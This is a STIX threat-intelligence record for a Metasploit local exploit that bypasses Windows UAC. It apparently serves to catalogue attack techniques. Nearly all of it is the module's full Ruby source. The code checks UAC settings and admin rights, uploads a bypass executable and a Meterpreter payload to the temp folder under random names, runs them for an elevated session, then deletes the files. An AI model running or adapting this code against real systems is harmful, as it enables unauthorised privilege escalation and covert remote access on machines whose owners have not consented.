{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a67155e9-d9fc-4ec6-a26d-d3144e7334e6",
    "created": "2024-08-14T16:48:55.492076Z",
    "modified": "2024-08-14T16:48:55.49208Z",
    "name": "Windows Escalate UAC Protection Bypass",
    "description": " This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac.rb",
            "external_id": "bypassuac.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.trustedsec.com/december-2010/bypass-windows-uac/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::EXE\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass',\n        'Description' => %q{\n          This module will bypass Windows UAC by utilizing the trusted publisher\n          certificate through process injection. It will spawn a second shell that\n          has the UAC flag turned off.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>',\n          'mitnick',\n          'mubix' # Port to local exploit\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/' ]\n        ],\n        'DisclosureDate' => '2010-12-31',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptEnum.new('TECHNIQUE', [\n        true, 'Technique to use if UAC is turned off',\n        'EXE', %w[PSH EXE]\n      ]),\n    ])\n  end\n\n  def check_permissions!\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\n\n  def exploit\n    validate_environment!\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP, UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP, UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good 'UAC is set to Default'\n      print_good 'BypassUAC can bypass this setting, continuing...'\n    when UAC_NO_PROMPT\n      print_warning \"UAC set to DoNotPrompt - using ShellExecute 'runas' method instead\"\n      runas_method\n      return\n    end\n\n    check_permissions!\n\n    upload_binaries!\n\n    cmd = \"#{path_bypass} /c #{path_payload}\"\n    # execute the payload\n    pid = cmd_exec_get_pid(cmd)\n\n    ::Timeout.timeout(30) do\n      select(nil, nil, nil, 1) until session_created?\n    end\n    session.sys.process.kill(pid)\n    # delete the uac bypass payload\n    file_rm(path_bypass)\n    file_rm(\"#{expand_path('%TEMP%')}\\\\tior.exe\")\n    cmd_exec('cmd.exe', \"/c del \\\"#{expand_path('%TEMP%')}\\\\w7e*.tmp\\\"\")\n  end\n\n  def path_bypass\n    @path_bypass ||= \"#{expand_path('%TEMP%')}\\\\#{Rex::Text.rand_text_alpha(rand(6..13))}.exe\"\n  end\n\n  def path_payload\n    @path_payload ||= \"#{expand_path('%TEMP%')}\\\\#{Rex::Text.rand_text_alpha(rand(6..13))}.exe\"\n  end\n\n  def upload_binaries!\n    print_status('Uploaded the agent to the filesystem....')\n    #\n    # Generate payload and random names for upload\n    #\n    payload = generate_payload_exe\n\n    # path to the bypassuac binary\n    path = ::File.join(Msf::Config.data_directory, 'post')\n\n    bpexe = ::File.join(path, \"bypassuac-#{sysinfo['Architecture'] == ARCH_X86 ? 'x86' : 'x64'}.exe\")\n\n    print_status('Uploading the bypass UAC executable to the filesystem...')\n\n    begin\n      #\n      # Upload UAC bypass to the filesystem\n      #\n      upload_file(path_bypass.to_s, bpexe)\n      print_status(\"Meterpreter stager executable #{payload.length} bytes long being uploaded..\")\n\n      write_file(path_payload, payload)\n    rescue ::Exception => e\n      print_error(\"Error uploading file #{path_bypass}: #{e.class} #{e}\")\n      return\n    end\n  end\n\n  def runas_method\n    case datastore['TECHNIQUE']\n    when 'PSH'\n      # execute PSH\n      shell_execute_psh\n    when 'EXE'\n      # execute EXE\n      shell_execute_exe\n    end\n  end\n\n  def validate_environment!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    #\n    # Verify use against Vista+\n    #\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win81)\n      fail_with(Failure::NotVulnerable, \"#{version.product_name} is not vulnerable.\")\n    end\n\n    if is_uac_enabled?\n      print_status 'UAC is Enabled, checking level...'\n    elsif is_in_admin_group?\n      fail_with(Failure::Unknown, 'UAC is disabled and we are in the admin group so something has gone wrong...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-31",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}